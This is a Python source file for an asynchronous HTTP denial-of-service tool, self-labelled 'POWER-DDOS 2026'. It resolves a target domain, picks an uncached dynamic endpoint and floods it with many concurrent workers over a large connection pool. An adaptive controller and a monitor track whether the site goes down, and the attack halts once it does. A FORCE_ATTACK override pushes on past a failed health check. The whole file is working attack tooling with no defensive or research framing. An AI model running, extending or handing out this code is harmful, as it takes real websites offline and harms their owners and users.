import asyncio
import aiohttp
import time
import logging
import os
from urllib.parse import urlparse
from src.core.universal_cms import UniversalCMSDatabase
from src.core.fixed_metrics import FixedMetricsV2
from src.core.ultra_worker import ultra_worker
from src.core.ai_controller_v2 import AdaptiveControllerV2
from src.utils.cdn_hardened import is_static_asset
from src.utils.dns_resolver import pre_resolve_domain
from src.core.analysis.universal_adapter import UniversalTargetAdapter

async def health_check_v3(session: aiohttp.ClientSession, domain: str, ip: str) -> dict:
    """
    Standardized health check with strict thresholds.
    """
    url = f"https://{ip}/"
    headers = {"Host": domain}
    timeout = aiohttp.ClientTimeout(total=3, connect=1, sock_read=2)  # Strict 3s
    
    try:
        start = time.monotonic()
        async with session.get(url, headers=headers, timeout=timeout, ssl=False, allow_redirects=False) as resp:
            latency = (time.monotonic() - start) * 1000
            
            if resp.status >= 400:
                return {"ok": False, "error": f"HTTP {resp.status}", "latency": latency}
            
            if latency > 3000:  # Reduced from 5000ms
                return {"ok": False, "error": f"Latency too high: {latency:.0f}ms", "latency": latency}
                
            return {"ok": True, "status": resp.status, "latency": latency}
    except Exception as e:
        return {"ok": False, "error": str(e), "latency": 0}

async def benchmark_v3(session: aiohttp.ClientSession, domain: str, ip: str, duration: int = 3) -> dict:
    """
    Benchmark using the attack session.
    """
    url = f"https://{ip}/"
    headers = {"Host": domain}
    start = time.monotonic()
    count = 0
    
    # Use the same strict timeout as workers
    timeout = aiohttp.ClientTimeout(total=3, connect=1, sock_read=2)
    
    while time.monotonic() - start < duration:
        try:
            async with session.get(url, headers=headers, timeout=timeout, ssl=False, allow_redirects=False) as resp:
                if resp.status < 400:
                    count += 1
        except:
            pass
    
    elapsed = time.monotonic() - start
    return {"rps": count / elapsed if elapsed > 0 else 0}

async def run_universal_attack(domain: str, duration: int, threads: int, recon_data: dict = None):
    """
    The ultimate attack orchestrator v4.0 [2026].
    Cloudflare-grade distributed architecture.
    """
    logger = logging.getLogger("UniversalAttack")
    
    # 1. Recon & Adaptation
    adapter = UniversalTargetAdapter(domain, recon_data)
    cms = adapter.cms or "generic"
    
    # 2. DNS
    resolved = pre_resolve_domain(domain)
    ip = resolved["ip"]
    
    # 3. Target Selection
    endpoints = adapter.discover_endpoints()
    valid_endpoints = []
    for ep in endpoints:
        blocked, reason = is_static_asset(ep["url"], cms)
        if not blocked:
            valid_endpoints.append(ep)
            
    if not valid_endpoints:
        logger.error("No valid dynamic endpoints found.")
        return
        
    target = valid_endpoints[0]
    attack_path = urlparse(target["url"]).path
    attack_url = f"https://{ip}{attack_path}"
    
    # 4. Session Setup (Unified for health and attack)
    # POWER-DDOS 2026: Massive connection pool for true concurrency
    connector = aiohttp.TCPConnector(
        limit=threads * 5,           # 500 total for 100 threads
        limit_per_host=threads * 4,  # 400 per host (no bottleneck)
        ssl=False,
        use_dns_cache=False,
        ttl_dns_cache=0,            # No DNS caching - always fresh
        force_close=False,          # Keep connections alive
        keepalive_timeout=30        # 30s keepalive
    )
    
    async with aiohttp.ClientSession(
        connector=connector,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        timeout=aiohttp.ClientTimeout(total=5, connect=2, sock_read=3)
    ) as session:
        
        # 5. Health & Bench (Using the same session)
        health = await health_check_v3(session, domain, ip)
        if not health["ok"]:
            logger.error(f"Health check failed: {health['error']}")
            if not os.environ.get("FORCE_ATTACK"):
                return
            logger.warning("FORCE_ATTACK enabled, continuing despite health check failure.")
            
        bench = await benchmark_v3(session, domain, ip)
        logger.info(f"Baseline Benchmark: {bench['rps']:.1f} RPS")
        
        # 6. Execution
        from rich.console import Console
        console = Console()
        
        metrics = FixedMetricsV2()
        ai = AdaptiveControllerV2(domain, metrics)
        stop_event = asyncio.Event()
        
        # Real-Time External Health Monitor
        async def external_monitor():
            monitor_session = aiohttp.ClientSession(headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
            try:
                while not stop_event.is_set():
                    await asyncio.sleep(10)
                    try:
                        async with monitor_session.get(f"https://{domain}/", timeout=5) as resp:
                            if resp.status < 400:
                                console.print(f"[bold green][MONITOR] Target {domain} is still ONLINE (HTTP {resp.status})[/bold green]")
                            else:
                                console.print(f"[bold yellow][MONITOR] Target {domain} returning HTTP {resp.status}[/bold yellow]")
                    except:
                        console.print(f"[bold red][MONITOR] Target {domain} is NOT RESPONDING (Possible Down)[/bold red]")
            finally:
                await monitor_session.close()

        console.print(f"[bold white][*] Launching {threads} workers on: {attack_url}[/bold white]")
        
        # Launch workers - all at once for max concurrency
        workers = [
            asyncio.create_task(ultra_worker(session, attack_url, metrics, stop_event, domain))
            for _ in range(threads)
        ]
        
        ai_task = asyncio.create_task(ai.monitor_loop())
        monitor_task = asyncio.create_task(external_monitor())
        
        # Power-DDoS 2026: Monitor for Kill Switch
        start_time = time.monotonic()
        while time.monotonic() - start_time < duration:
            await asyncio.sleep(1)
            if getattr(ai, 'target_is_down', False):
                console.print(f"\n[bold red][!] TARGET {domain} IS DOWN. STOPPING ATTACK... [!][/bold red]")
                break
                
        stop_event.set()
        
        # Finalize
        await asyncio.wait(workers, timeout=5)
        ai.stop()
        await ai_task
        await monitor_task
        
        # Results
        summary = metrics.get_summary()
        
        # Use standard characters for borders to avoid Windows encoding issues
        console.print("\n" + "[bold grey37]--------------------------------------------------[/bold grey37]")
        console.print(f" [bold red]ATTACK SUMMARY[/bold red] - [bold white]{domain}[/bold white]")
        console.print(f" [bold white]CMS:[/bold white] [dim white]{cms}[/dim white] | [bold white]IP:[/bold white] [dim white]{ip}[/dim white]")
        console.print(f" [bold white]Attempted:[/bold white] [bold red]{summary['attempted']}[/bold red]")
        console.print(f" [bold white]Completed:[/bold white] [bold green]{summary['completed']}[/bold green]")
        console.print(f" [bold white]RPS:[/bold white] [bold white]{summary['rps']}[/bold white]")
        console.print(f" [bold white]Latency:[/bold white] [bold white]{summary['avg_latency_ms']:.0f}ms[/bold white]")
        console.print("[bold grey37]--------------------------------------------------[/bold grey37]\n")
        
        return summary
